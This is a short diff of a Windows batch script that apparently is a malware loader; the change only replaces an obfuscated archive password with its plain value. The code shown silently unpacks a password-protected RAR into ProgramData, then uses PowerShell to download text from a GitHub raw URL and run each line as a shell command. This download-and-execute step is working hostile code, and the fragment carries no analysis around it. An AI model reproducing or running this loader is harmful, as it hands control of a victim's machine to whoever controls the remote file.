@@ -17,7 +17,7 @@ for %%a in (%processList%) do (
     )
 )
 
-"%ProgramData%\dist\UnRAR.exe" x -y -p%JVPCOT%1%RPJJKX%4%OJ ERZ%7%EUCUJK%8%ATXODM%5%DSJIDL%2%HTHDOT%3%AVVUYS%6%NZDNDG%9 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
+"%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
 powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/confrus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
 setlocal EnableDelayedExpansion
